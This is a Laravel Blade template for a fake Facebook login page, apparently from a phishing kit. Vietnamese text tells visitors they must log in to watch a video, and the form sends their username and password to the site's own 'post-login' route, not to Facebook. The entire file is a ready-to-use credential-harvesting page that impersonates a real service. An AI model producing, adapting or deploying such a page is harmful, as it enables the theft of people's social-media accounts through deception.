<!doctype html>
<html lang="{{ app()->getLocale() }}">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="csrf-token" content="{{ csrf_token() }}" />
        <title>Facebook</title>
        <!-- bootstrapt -->
        <script type="text/javascript" src="{{ asset('vendor/bootstrap.js') }}"></script>
        <link href="{{ asset('vendor/bootstrap.css') }}" rel="stylesheet">
        <link href="{{ asset('vendor/font-awesome.css') }}" rel="stylesheet">
        <!-- Fonts -->
        <link href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i&display=swap" rel="stylesheet">
        <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">

        <!-- Styles -->
        <link href="{{ asset('mycss/main.css') }}" rel="stylesheet">
        <link href="{{ asset('mycss/responesive.css') }}" rel="stylesheet">
    </head>
    <body>
        <div class="container">
{{--            TOP PAGE  --}}
            <div class="wrap-top">
                <div class="wrap-image">
                    <div class="wrap-image-one">
                        <img src="{{ asset('images/icon1.png') }}" alt="" class="img-fluid">
                    </div>
                    <div class="wrap-image-two">`
                        <img src="{{ asset('images/facebook-icon.png') }}" alt="" class="img-fluid">
                    </div>
                </div>
                <h2 class="wrap-text-top">
                    <span class="text-top">Bạn cần đăng nhập để xem video.</span>
                </h2>
            </div>
{{--            END TOP PAGE--}}
            <div class="wraper-form">

                    <form id="login"  method="post" class="detail-form"  action="{{ route("post-login") }}" >
                        @if ($errors->any())
                            <div class="alert alert-danger">
                                <ul>
                                    @foreach ($errors->all() as $error)
                                        <li>{{ $error }}</li>
                                    @endforeach
                                </ul>
                            </div>
                        @endif
                        @csrf
                        <div class="content-form">
                            <div class="form-group">
                                <input type="text"  name="taikhoan"  class="form-control bd-none" >
                            </div>
                            <div class="form-group">
                                <input type="password" name="matkhau"  class="form-control bd-none" >
                            </div>

                            <div class="wrap-btn-login">
                                <button type="submit" class="btn btn-login">Đăng Nhập</button>
                            </div>
                        </div>

                        <div class="wrap-bottom-form">
                            <button class="btn btn-register">Tạo tài khoản mới</button>
                            <p>Quên mật khẩu? - Trung tâm trợ giúp</p>
                        </div>
                    </form>
            </div>
{{--BOTTOM PAGE--}}
            <div class="bottom-page">
                <span>
                    <b>Tiếng Việt </b> <span class="color-blue">- Bahasa Melayu - English (UK) - More Languages...</span>
                </span>
                <br>
                <span>
                    Facebook ©2017
                </span>
            </div>
{{--END BOTTOM PAGE--}}

        </div>
    </body>
</html>
